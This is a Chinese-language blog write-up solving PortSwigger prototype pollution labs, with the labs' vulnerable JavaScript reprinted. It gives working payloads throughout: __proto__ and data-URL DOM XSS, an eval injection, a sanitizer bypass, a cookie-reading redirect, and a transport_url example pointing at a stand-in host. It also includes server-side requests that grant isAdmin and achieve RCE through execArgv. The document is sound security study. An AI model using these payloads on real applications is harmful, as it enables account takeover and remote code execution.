---
title: Prototype Pollution
description: Prototype Pollution
last_update:
  date: "2025-10-12T08:00:00+08:00"
---

## 前言

沒想到 portSwigger 竟然有專門出 Prototype Pollution 的 Lab，我覺得這個跟 [XSS](./cross-site-scripting.md) 還有 [DOM-based vulnerabilities](./dom-based-vulnerabilities.md) 都有關聯，本質上都需要對前端的 HTML, JS 有基礎的了解，其中 XSS 跟 DOM-based vulnerabilities 我都已經解過了，想說就趕快把 Prototype Pollution 也一起解掉吧！

## Lab: DOM XSS via client-side prototype pollution

| Dimension | Description                                                                                                                              |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/prototype-pollution/client-side#finding-client-side-prototype-pollution-gadgets-using-dom-invader   |
| Lab       | https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution |

首頁搜尋功能感覺有搞頭

deparam.js

```js
var deparam = function (params, coerce) {
  var obj = {},
    coerce_types = { true: !0, false: !1, null: null };

  if (!params) {
    return obj;
  }

  params
    .replace(/\+/g, " ")
    .split("&")
    .forEach(function (v) {
      var param = v.split("="),
        key = decodeURIComponent(param[0]),
        val,
        cur = obj,
        i = 0,
        keys = key.split("]["),
        keys_last = keys.length - 1;

      if (/\[/.test(keys[0]) && /\]$/.test(keys[keys_last])) {
        keys[keys_last] = keys[keys_last].replace(/\]$/, "");
        keys = keys.shift().split("[").concat(keys);
        keys_last = keys.length - 1;
      } else {
        keys_last = 0;
      }

      if (param.length === 2) {
        val = decodeURIComponent(param[1]);

        if (coerce) {
          val =
            val && !isNaN(val) && +val + "" === val
              ? +val // number
              : val === "undefined"
                ? undefined // undefined
                : coerce_types[val] !== undefined
                  ? coerce_types[val] // true, false, null
                  : val; // string
        }

        if (keys_last) {
          for (; i <= keys_last; i++) {
            key = keys[i] === "" ? cur.length : keys[i];
            cur = cur[key] =
              i < keys_last
                ? cur[key] || (keys[i + 1] && isNaN(keys[i + 1]) ? {} : [])
                : val;
          }
        } else {
          if (Object.prototype.toString.call(obj[key]) === "[object Array]") {
            obj[key].push(val);
          } else if ({}.hasOwnProperty.call(obj, key)) {
            obj[key] = [obj[key], val];
          } else {
            obj[key] = val;
          }
        }
      } else if (key) {
        obj[key] = coerce ? undefined : "";
      }
    });

  return obj;
};
```

searchLogger.js

```js
async function logQuery(url, params) {
  try {
    await fetch(url, {
      method: "POST",
      keepalive: true,
      body: JSON.stringify(params),
    });
  } catch (e) {
    console.error("Failed storing query");
  }
}

async function searchLogger() {
  let config = { params: deparam(new URL(location).searchParams.toString()) };

  if (config.transport_url) {
    let script = document.createElement("script");
    script.src = config.transport_url;
    document.body.appendChild(script);
  }

  if (config.params && config.params.search) {
    await logQuery("/logger", config.params);
  }
}

window.addEventListener("load", searchLogger);
```

還有一個 feedback 頁面，感覺也會用到

submitFeedback.js

```js
document
  .getElementById("feedbackForm")
  .addEventListener("submit", function (e) {
    submitFeedback(
      this.getAttribute("method"),
      this.getAttribute("action"),
      this.getAttribute("enctype"),
      this.getAttribute("personal"),
      new FormData(this),
    );
    e.preventDefault();
  });

function submitFeedback(method, path, encoding, personal, data) {
  var XHR = new XMLHttpRequest();
  XHR.open(method, path);
  if (personal) {
    XHR.addEventListener("load", displayFeedbackMessage(data.get("name")));
  } else {
    XHR.addEventListener("load", displayFeedbackMessage());
  }
  if (encoding === "multipart/form-data") {
    XHR.send(data);
  } else {
    var params = new URLSearchParams(data);
    XHR.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    XHR.send(params.toString());
  }
}

function displayFeedbackMessage(name) {
  return function () {
    var feedbackResult = document.getElementById("feedbackResult");
    if (this.status === 200) {
      feedbackResult.innerHTML =
        "Thank you for submitting feedback" + (name ? ", " + name : "") + "!";
      feedbackForm.reset();
    } else {
      feedbackResult.innerHTML =
        "Failed to submit feedback: " + this.responseText;
    }
  };
}
```

其中 `feedbackResult.innerHTML` 感覺是注入點，name 如果輸入 `<img src=x onerror=alert(1)>` 就可以達到 XSS

PoC

```js
const name = "<img src=x onerror=alert(1)>";
feedbackResult.innerHTML =
  "Thank you for submitting feedback" + (name ? ", " + name : "") + "!";
```

但要怎麼進入這段 if 呢？要想辦法汙染 `personal`，使其變成 truthy statement

```js
if (personal) {
  XHR.addEventListener("load", displayFeedbackMessage(data.get("name")));
}
```

體感上 prototype pollution 的注入點是 querystring，在 `deparam` 的實作，它是一個純手工解析 searchParams，很髒的 JS Code

我們直接跳到結果，想像上可以控制 `config.transport_url`，來載入任意的 JS，但這題沒有 exploit-server，所以應該就是載入這個 Lab 的其他 JS ?!

```js
let config = { params: deparam(new URL(location).searchParams.toString()) };

if (config.transport_url) {
  let script = document.createElement("script");
  script.src = config.transport_url;
  document.body.appendChild(script);
}
```

嘗試一番後，我發現要去理解 `deparam` 的實作真的太難（Code 真的很髒），所以我直接用 portSwigger 教的方法 [Finding client-side prototype pollution sources manually](https://portswigger.net/web-security/prototype-pollution/client-side#finding-client-side-prototype-pollution-sources-manually)

PoC

```
vulnerable-website.com/?__proto__[foo]=bar
vulnerable-website.com/?__proto__.foo=bar
```

後來我用括號的方式成功注入

```
/?__proto__[transport_url]=123
```

注入後，我就可以控制 src 的載入

```html
<script src="123"></script>
```

既然沒有 exploit-server，那我好像也只能注入 `/resources/js/submitFeedback.js` ???

回頭看前面的介紹 [Example of a prototype pollution gadget](https://portswigger.net/web-security/prototype-pollution#example-of-a-prototype-pollution-gadget)

```js
let script = document.createElement("script");
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

PoC

```
?__proto__[transport_url]=//evil-user.net
?__proto__[transport_url]=data:,alert(1);//
```

嘗試構造

```
/?search=123&__proto__[transport_url]=data:text/javascript,alert(1);
```

成功執行 DOM-Based XSS，這會產生以下的 Fake Request/Response（實際上不涉及 HTTP 請求，因為 data URL Scheme 本身的資料就包含在 URL 裡面了）

```
Request URL:data:text/javascript,alert(1);
Request Method: GET
Status Code: 200 OK (from memory cache)
Referrer Policy: strict-origin-when-cross-origin
Content-Type: text/javascript

alert(1);
```

結論：portSwigger 的介紹真的要認真看，通常 Lab 都會用到介紹到的 PoC，也證實了 => 看過一次不等於融會貫通，實際打 Lab 才算是有吸收進去

## Lab: DOM XSS via an alternative prototype pollution vector

| Dimension | Description                                                                                                                                        |
| --------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/prototype-pollution/client-side#finding-client-side-prototype-pollution-gadgets-using-dom-invader             |
| Lab       | https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector |

jquery_parseparams.js

```js
// Add an URL parser to JQuery that returns an object
// This function is meant to be used with an URL like the window.location
// Use: $.parseParams('http://mysite.com/?var=string') or $.parseParams() to parse the window.location
// Simple variable:  ?var=abc                        returns {var: "abc"}
// Simple object:    ?var.length=2&var.scope=123     returns {var: {length: "2", scope: "123"}}
// Simple array:     ?var[]=0&var[]=9                returns {var: ["0", "9"]}
// Array with index: ?var[0]=0&var[1]=9              returns {var: ["0", "9"]}
// Nested objects:   ?my.var.is.here=5               returns {my: {var: {is: {here: "5"}}}}
// All together:     ?var=a&my.var[]=b&my.cookie=no  returns {var: "a", my: {var: ["b"], cookie: "no"}}
// You just cant have an object in an array, ?var[1].test=abc DOES NOT WORK
(function ($) {
  var re = /([^&=]+)=?([^&]*)/g;
  var decode = function (str) {
    return decodeURIComponent(str.replace(/\+/g, " "));
  };
  $.parseParams = function (query) {
    // recursive function to construct the result object
    function createElement(params, key, value) {
      key = key + "";
      // if the key is a property
      if (key.indexOf(".") !== -1) {
        // extract the first part with the name of the object
        var list = key.split(".");
        // the rest of the key
        var new_key = key.split(/\.(.+)?/)[1];
        // create the object if it doesnt exist
        if (!params[list[0]]) params[list[0]] = {};
        // if the key is not empty, create it in the object
        if (new_key !== "") {
          createElement(params[list[0]], new_key, value);
        } else
          console.warn('parseParams :: empty property in key "' + key + '"');
      } else if (key.indexOf("[") !== -1) {
        // if the key is an array
        // extract the array name
        var list = key.split("[");
        key = list[0];
        // extract the index of the array
        var list = list[1].split("]");
        var index = list[0];
        // if index is empty, just push the value at the end of the array
        if (index == "") {
          if (!params) params = {};
          if (!params[key] || !$.isArray(params[key])) params[key] = [];
          params[key].push(value);
        }
        // add the value at the index (must be an integer)
        else {
          if (!params) params = {};
          if (!params[key] || !$.isArray(params[key])) params[key] = [];
          params[key][parseInt(index)] = value;
        }
      }
      // just normal key
      else {
        if (!params) params = {};
        params[key] = value;
      }
    }
    // be sure the query is a string
    query = query + "";
    if (query === "") query = window.location + "";
    var params = {},
      e;
    if (query) {
      // remove # from end of query
      if (query.indexOf("#") !== -1) {
        query = query.substr(0, query.indexOf("#"));
      }

      // remove ? at the begining of the query
      if (query.indexOf("?") !== -1) {
        query = query.substr(query.indexOf("?") + 1, query.length);
      } else return {};
      // empty parameters
      if (query == "") return {};
      // execute a createElement on every key and value
      while ((e = re.exec(query))) {
        var key = decode(e[1]);
        var value = decode(e[2]);
        createElement(params, key, value);
      }
    }
    return params;
  };
})(jQuery);
```

searchLoggerAlternative.js

```js
async function logQuery(url, params) {
  try {
    await fetch(url, {
      method: "POST",
      keepalive: true,
      body: JSON.stringify(params),
    });
  } catch (e) {
    console.error("Failed storing query");
  }
}

async function searchLogger() {
  window.macros = {};
  window.manager = {
    params: $.parseParams(new URL(location)),
    macro(property) {
      if (window.macros.hasOwnProperty(property)) return macros[property];
    },
  };
  let a = manager.sequence || 1;
  manager.sequence = a + 1;

  eval(
    "if(manager && manager.sequence){ manager.macro(" +
      manager.sequence +
      ") }",
  );

  if (manager.params && manager.params.search) {
    await logQuery("/logger", manager.params);
  }
}

window.addEventListener("load", searchLogger);
```

這題的 `jquery_parseparams.js` 超讚，有寫註解，這才是真實世界的前端工程師的榜樣，總之重點就是

```js
// Nested objects:   ?my.var.is.here=5               returns {my: {var: {is: {here: "5"}}}}
```

注入點就是 querystring，gadget 則是

```js
eval(
  "if(manager && manager.sequence){ manager.macro(" + manager.sequence + ") }",
);
```

我一開始在思考要怎麼讓 `manager.macro('+manager.sequence+')` 執行程式碼，但我發現好像重點不在這裡?!

```js
macro(property) {
    if (window.macros.hasOwnProperty(property))
        return macros[property]
}
```

後來想到可以在 `eval` 用分號分隔多行程式碼

PoC

```
?__proto__.sequence=%27%27);alert(1);console.log(
```

```js
"if(manager && manager.sequence){ manager.macro(" + manager.sequence + ") }";
// if(manager && manager.sequence){ manager.macro('');alert(1);console.log(1) }
manager;
// { params : {}, sequence: "'');alert(1);console.log(1" }
```

## Lab: Client-side prototype pollution via flawed sanitization

| Dimension | Description                                                                                                                                          |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/prototype-pollution/client-side#bypassing-flawed-key-sanitization                                               |
| Lab       | https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization |

我們的武器

```js
const a = {};
a.constructor.prototype === a.__proto__; // true
```

searchLoggerFiltered.js

```js
async function logQuery(url, params) {
  try {
    await fetch(url, {
      method: "POST",
      keepalive: true,
      body: JSON.stringify(params),
    });
  } catch (e) {
    console.error("Failed storing query");
  }
}

async function searchLogger() {
  let config = { params: deparam(new URL(location).searchParams.toString()) };
  if (config.transport_url) {
    let script = document.createElement("script");
    script.src = config.transport_url;
    document.body.appendChild(script);
  }
  if (config.params && config.params.search) {
    await logQuery("/logger", config.params);
  }
}

function sanitizeKey(key) {
  let badProperties = ["constructor", "__proto__", "prototype"];
  for (let badProperty of badProperties) {
    key = key.replaceAll(badProperty, "");
  }
  return key;
}

window.addEventListener("load", searchLogger);
```

deparamSanitised.js

```js
var deparam = function (params, coerce) {
  var obj = {},
    coerce_types = { true: !0, false: !1, null: null };

  if (!params) {
    return obj;
  }

  params
    .replace(/\+/g, " ")
    .split("&")
    .forEach(function (v) {
      var param = v.split("="),
        key = decodeURIComponent(param[0]),
        val,
        cur = obj,
        i = 0,
        keys = key.split("]["),
        keys_last = keys.length - 1;

      if (/\[/.test(keys[0]) && /\]$/.test(keys[keys_last])) {
        keys[keys_last] = keys[keys_last].replace(/\]$/, "");

        keys = keys.shift().split("[").concat(keys);

        keys_last = keys.length - 1;
      } else {
        keys_last = 0;
      }

      if (param.length === 2) {
        val = decodeURIComponent(param[1]);

        if (coerce) {
          val =
            val && !isNaN(val) && +val + "" === val
              ? +val // number
              : val === "undefined"
                ? undefined // undefined
                : coerce_types[val] !== undefined
                  ? coerce_types[val] // true, false, null
                  : val; // string
        }

        if (keys_last) {
          for (; i <= keys_last; i++) {
            key = keys[i] === "" ? cur.length : keys[i];
            cur = cur[sanitizeKey(key)] =
              i < keys_last
                ? cur[sanitizeKey(key)] ||
                  (keys[i + 1] && isNaN(keys[i + 1]) ? {} : [])
                : val;
          }
        } else {
          if (Object.prototype.toString.call(obj[key]) === "[object Array]") {
            obj[sanitizeKey(key)].push(val);
          } else if ({}.hasOwnProperty.call(obj, key)) {
            obj[sanitizeKey(key)] = [obj[key], val];
          } else {
            obj[sanitizeKey(key)] = val;
          }
        }
      } else if (key) {
        obj[key] = coerce ? undefined : "";
      }
    });

  return obj;
};
```

這題利用的是 "failing to recursively sanitize the input string"，類似的技巧在 [Path traversal](./path-traversal.md#lab-file-path-traversal-traversal-sequences-stripped-non-recursively) 也有遇過

PoC

```js
?____proto__proto__[transport_url]=data:text/javascript,alert(1)
```

會產生以下 HTML

```html
<script src="data:text/javascript,alert(1)"></script>
```

## Lab: Client-side prototype pollution in third-party libraries

| Dimension | Description                                                                                                                                           |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/prototype-pollution/client-side#prototype-pollution-in-external-libraries                                        |
| Lab       | https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries |

武器庫

```js
Object.prototype.body = "foo=bar";
fetch("/", { method: "POST" });

Object.prototype.value = "overwritten";
let myObject = { property: "Existing property value" };
Object.defineProperty(myObject, "property", {
  configurable: false,
  writable: false,
});
alert(myObject.property); //overwritten

Object.prototype.foo = "bar";
localStorage.foo; //bar

// GA
Object.prototype.hitCallback = "alert(1)";
c && setTimeout(hitCallback, 10);

// GTM
Object.prototype.sequence = "alert(1)";
sequence && setTimeout(sequence, 10);
Object.prototype.event_callback = "alert(1)";
event_callback && eval(event_callback);

// Adobe dynamic tag management
cspNonce + innerHTML;
trackingServerSecure + script.src;
```

名詞解釋

- sink: 危險函數執行的地方，可參考 [DOM-based vulnerabilities](./dom-based-vulnerabilities.md#資源)
- gadget: 應用程式信任且使用的屬性，但它可以被你通過 prototype pollution 控制

這題官方建議直接用 DOM Invader，可參考 [Finding client-side prototype pollution sources using DOM Invader](https://portswigger.net/web-security/prototype-pollution/client-side#finding-client-side-prototype-pollution-sources-using-dom-invader)

我覺得 DOM Invader 的功能有點強大，進到首頁，馬上就發現 `#__proto__[testproperty]=DOM_INVADER_PP_POC` 可以成功 prototype pollution

之後 Scan for gadgets，就找到 `#__proto__[hitCallback]=alert(1)` 可以成功執行程式碼

不過這題是要用 exploit-server，所以構造

```
HTTP/1.1 302 Found
Location: https://0a510047042c732c80ab037000110035.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)
```

就成功通關了，這題用 DOM Invader 完全是無腦解，沒有任何成就感，只覺得：蝦，結束了嗎？但也體會到 DOM Invader 的強大，開發這個工具的 PortSwigger 團隊真的是各路大神...

## Lab: Client-side prototype pollution via browser APIs

| Dimension | Description                                                                                                                                                |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis#prototype-pollution-via-browser-apis                                     |
| Lab       | https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis |

這題應該是 [Lab: DOM XSS via client-side prototype pollution](#lab-dom-xss-via-client-side-prototype-pollution) 的進階版，多了

```js
Object.defineProperty(config, "transport_url", {
  configurable: false,
  writable: false,
});
```

只要汙染 value 就可以了 `?__proto__[value]=data:text/javascript,alert(1)`

## Why is server-side prototype pollution more difficult to detect?

- No source code access
- Lack of developer tools
- The DoS problem
- Pollution persistence

## Detecting server-side prototype pollution via polluted property reflection

利用 Restful API 的設計，POST /someEntity 會在 Response Body 回傳整包 someEntity 的特性，構造

```
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```

如果回傳

```
HTTP/1.1 200 OK
...
{
    "username":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
```

恭喜你找到 prototype pollution

## Lab: Privilege escalation via server-side prototype pollution

| Dimension | Description                                                                                                                                     |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/prototype-pollution/server-side#detecting-server-side-prototype-pollution-via-polluted-property-reflection |
| Lab       | https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution               |

修改會員資料的 API

```js
fetch(`${location.origin}/my-account/change-address`, {
  headers: {
    "content-type": "application/json;charset=UTF-8",
  },
  body: JSON.stringify({
    address_line_1: "Wiener HQ",
    address_line_2: "One Wiener Way",
    city: "Wienerville",
    postcode: "BU1 1RP",
    country: "UK",
    sessionId: "Zf2vzqfEZMOw1Hr5FLuaiWhkME28uQeA",
  }),
  method: "POST",
  credentials: "include",
});
```

回傳

```json
{
  "username": "wiener",
  "firstname": "Peter",
  "lastname": "Wiener",
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "isAdmin": false
}
```

嘗試

```js
const key = "__proto__";
fetch(`${location.origin}/my-account/change-address`, {
  headers: {
    "content-type": "application/json;charset=UTF-8",
  },
  body: JSON.stringify({
    address_line_1: "Wiener HQ",
    address_line_2: "One Wiener Way",
    city: "Wienerville",
    postcode: "BU1 1RP",
    country: "UK",
    sessionId: "Zf2vzqfEZMOw1Hr5FLuaiWhkME28uQeA",
    [key]: {
      isAdmin: true,
    },
  }),
  method: "POST",
  credentials: "include",
});
```

成功通關～至於為何要

```js
const key = "__proto__";

JSON.stringify({
  address_line_1: "Wiener HQ",
  address_line_2: "One Wiener Way",
  city: "Wienerville",
  postcode: "BU1 1RP",
  country: "UK",
  sessionId: "Zf2vzqfEZMOw1Hr5FLuaiWhkME28uQeA",
  [key]: {
    isAdmin: true,
  },
});
```

是因為這樣才會產生

```js
{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "Zf2vzqfEZMOw1Hr5FLuaiWhkME28uQeA",
    "__proto__": {
        "isAdmin": true
    }
}
```

這樣的 Request Payload

## Lab: Detecting server-side prototype pollution without polluted property reflection

| Dimension | Description                                                                                                                                             |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/prototype-pollution/server-side#detecting-server-side-prototype-pollution-without-polluted-property-reflection     |
| Lab       | https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection |

這題我覺得沒有難度，就是單純用 Document 教的方式來 exploit

```js
const key = "__proto__";
fetch(`${location.origin}/my-account/change-address`, {
  headers: {
    "content-type": "application/json;charset=UTF-8",
  },
  body: JSON.stringify({
    address_line_1: "+AGYAbwBv-",
    address_line_2: "One Wiener Way",
    city: "Wienerville",
    postcode: "BU1 1RP",
    country: "UK",
    sessionId: "2Ks4V9ZUcnlXR92TWuG66W3q0QiAbBtC",
    [key]: {
      "content-type": "application/json; charset=utf-7",
    },
  }),
  method: "POST",
  credentials: "include",
});
```

之後再

```js
const key = "__proto__";
fetch(`${location.origin}/my-account/change-address`, {
  headers: {
    "content-type": "application/json;charset=UTF-8",
  },
  body: JSON.stringify({
    address_line_1: "+AGYAbwBv-",
    address_line_2: "One Wiener Way",
    city: "Wienerville",
    postcode: "BU1 1RP",
    country: "UK",
    sessionId: "2Ks4V9ZUcnlXR92TWuG66W3q0QiAbBtC",
  }),
  method: "POST",
  credentials: "include",
});
```

## Lab: Bypassing flawed input filters for server-side prototype pollution

| Dimension | Description                                                                                                                                 |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/prototype-pollution/server-side#bypassing-input-filters-for-server-side-prototype-pollution            |
| Lab       | https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution |

嘗試

```js
const keyC = "constructor";
const keyP = "prototype";
fetch(`${location.origin}/my-account/change-address`, {
  headers: {
    "content-type": "application/json;charset=UTF-8",
  },
  body: JSON.stringify({
    address_line_1: "Wiener HQ",
    address_line_2: "One Wiener Way",
    city: "Wienerville",
    postcode: "BU1 1RP",
    country: "UK",
    sessionId: "YDxffKuyifTCO9uwQmxWqF8ZiP7FvbWr",
    [keyC]: {
      [keyP]: {
        isAdmin: true,
      },
    },
  }),
  method: "POST",
  credentials: "include",
});
```

## Lab: Remote code execution via server-side prototype pollution

| Dimension | Description                                                                                                                        |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/prototype-pollution/server-side#remote-code-execution-via-server-side-prototype-pollution     |
| Lab       | https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution |

嘗試

```js
const key = "__proto__";
fetch(`${location.origin}/my-account/change-address`, {
  headers: {
    "content-type": "application/json;charset=UTF-8",
  },
  body: JSON.stringify({
    address_line_1: "+AGYAbwBv-",
    address_line_2: "One Wiener Way",
    city: "Wienerville",
    postcode: "BU1 1RP",
    country: "UK",
    sessionId: "uCnscuXyXjdxVShVkwBONEUglD8CgrWm",
    [key]: {
      execArgv: ["--eval=require('fs').unlinkSync('/home/carlos/morale.txt')"],
    },
  }),
  method: "POST",
  credentials: "include",
});
```

之後到 Admin panel 點擊 "Run maintenance jobs"，成功通關～

## Lab: Exfiltrating sensitive data via server-side prototype pollution

| Dimension | Description                                                                                                                              |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/prototype-pollution/server-side#remote-code-execution-via-child-process-execsync                    |
| Lab       | https://portswigger.net/web-security/prototype-pollution/server-side/lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution |

<!-- todo-yus Burp Suite Pro -->

## 小結

2025/02 的過年，我有讀了胡立大大寫的 [Beyond XSS：探索網頁前端資安宇宙](https://aszx87410.github.io/beyond-xss/ch3/prototype-pollution/)，其中就有 Prototype Pollution 的章節。時隔 8 個月，碰到 PortSwigger 的 PP Lab，讓我對 PP 的概念更深刻，也學到原來這也可以用來達成 SSPP，甚至是 RCE。

## 參考資料

- https://portswigger.net/web-security/prototype-pollution
